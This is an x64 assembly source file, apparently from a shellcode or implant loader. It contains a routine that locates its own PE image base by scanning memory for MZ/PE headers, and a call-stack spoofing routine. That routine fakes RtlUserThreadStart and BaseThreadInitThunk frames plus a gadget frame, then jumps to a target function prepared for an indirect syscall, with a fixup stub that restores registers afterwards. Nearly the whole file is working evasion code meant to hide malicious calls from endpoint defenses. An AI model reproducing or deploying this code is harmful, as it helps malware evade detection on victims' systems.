extern Entry

global Start
global Spoof
global GetRIP
global KaynCaller
global End
global Fixup

section .text$A
	Start:
        push    rsi
        mov		rsi, rsp
        and		rsp, 0FFFFFFFFFFFFFFF0h

        sub		rsp, 020h
        call    Entry
        
        mov		rsp, rsi
        pop		rsi
    ret

section .text$F
    KaynCaller:
           call caller
    caller:
           pop rcx
        
    find_dos:
        push r11
        sub rsp, 8
        loop:
            xor r11, r11
            mov r11w, 0x5A4D
            inc rcx
            cmp r11w, [ rcx ]
            jne loop
            xor rax, rax
            mov ax, [ rcx + 0x3C ]
            add rax, rcx
            xor r11, r11
            add r11w, 0x4550
            cmp r11w, [ rax ]
            jne loop
            mov rax, rcx
        pop r11
        add rsp, 8
    ret

    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

section .text$C

Spoof: 

    pop    r12                         ; Real return address in r12
    
    mov    r10, rdi                    ; Store OG rdi in r10
    mov    r11, rsi                    ; Store OG rsi in r11

    mov    rdi, [rsp + 32]             ; Storing struct in the rdi
    mov    rsi, [rsp + 40]             ; Storing function to call

    ; ---------------------------------------------------------------------
    ; Storing our original registers
    ; ---------------------------------------------------------------------

    mov [rdi + 24], r10                ; Storing OG rdi into param
    mov [rdi + 88], r11                ; Storing OG rsi into param
    mov [rdi + 96], r12                ; Storing OG r12 into param
    mov [rdi + 104], r13                ; Storing OG r13 into param
    mov [rdi + 112], r14                ; Storing OG r14 into param
    mov [rdi + 120], r15                ; Storing OG r15 into param

    ; ---------------------------------------------------------------------
    ; Prepping to move stack args
    ; ---------------------------------------------------------------------

    xor r11, r11            ; r11 will hold the # of args that have been "pushed"
    mov r13, [rsp + 30h]     ; r13 will hold the # of args total that will be pushed

    xor r14, r14
    add r14, 8
    add r14, [rdi + 56]     ; stack size of RUTS
    add r14, [rdi + 48]     ; stack size of BTIT
    add r14, [rdi + 32]     ; stack size of our gadget frame
    sub r14, 20h            ; first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time

    mov r10, rsp            
    add r10, 30h            ; offset of stack arg added to rsp

    looping:

        xor r15, r15            ; r15 will hold the offset + rsp base
        cmp r11, r13            ; comparing # of stack args added vs # of stack args we need to add
        je finish
    
        ; ---------------------------------------------------------------------
        ; Getting location to move the stack arg to
        ; ---------------------------------------------------------------------
        
        sub r14, 8          ; 1 arg means r11 is 0, r14 already 0x28 offset.
        mov r15, rsp        ; get current stack base
        sub r15, r14        ; subtract offset
        
        ; ---------------------------------------------------------------------
        ; Procuring the stack arg
        ; ---------------------------------------------------------------------
        
        add r10, 8
        push qword [r10]
        pop qword [r15]     ; move the stack arg into the right location

        ; ---------------------------------------------------------------------
        ; Increment the counter and loop back in case we need more args
        ; ---------------------------------------------------------------------
        add r11, 1
        jmp looping
    
    finish:


    ; ----------------------------------------------------------------------
    ; Pushing a 0 to cut off the return addresses after RtlUserThreadStart.
    ; ----------------------------------------------------------------------

    push 0

    ; ----------------------------------------------------------------------
    ; RtlUserThreadStart + 0x14  frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 56]
    mov    r11, [rdi + 64]
    mov    [rsp], r11
               
    ; ----------------------------------------------------------------------
    ; BaseThreadInitThunk + 0x21  frame
    ; ----------------------------------------------------------------------

    sub    rsp, [rdi + 32]
    mov    r11, [rdi + 40]
    mov    [rsp], r11

    ; ----------------------------------------------------------------------
    ; Gadget frame
    ; ----------------------------------------------------------------------
    
    sub    rsp, [rdi + 48]
    mov    r11, [rdi + 80]
    mov    [rsp], r11

    ; ----------------------------------------------------------------------
    ; Adjusting the param struct for the fixup
    ; ----------------------------------------------------------------------

    mov    r11, rsi                    ; Copying function to call into r11

    mov    [rdi + 8], r12              ; Real return address is now moved into the "OG_retaddr" member
    mov    [rdi + 16], rbx             ; original rbx is stored into "rbx" member
    mov    rbx, [rdi]                  ; Fixup address is moved into rbx
    mov    [rdi], rbx                  ; Fixup member now holds the address of Fixup
    mov    rbx, rdi                    ; Address of param struct (Fixup) is moved into rbx

    ; ----------------------------------------------------------------------
    ; Syscall shit. Shouldn't affect performance even if a syscall isnt made
    ; ----------------------------------------------------------------------
    mov    r10, rcx
    mov    rax, [rdi + 72]
    
    jmp    r11

section .text$C

    Fixup: 
  
        mov     rcx, rbx

        add     rsp, [rbx + 48]     ; Stack size
        add     rsp, [rbx + 32]     ; Stack size
        add     rsp, [rbx + 56]     ; Stack size
        
        mov      rbx, [rcx + 16]
        mov rdi, [rcx + 24]         ; ReStoring OG rdi
        mov rsi, [rcx + 88]         ; ReStoring OG rsi
        mov r12, [rcx + 96]         ; ReStoring OG r12
        mov r13, [rcx + 104]        ; ReStoring OG r13 
        mov r14, [rcx + 112]        ; ReStoring OG r14
        mov r15, [rcx + 120]        ; ReStoring OG r15 
	    jmp      [rcx + 8]

section .text$END
    End:
        jmp rbx
        ret
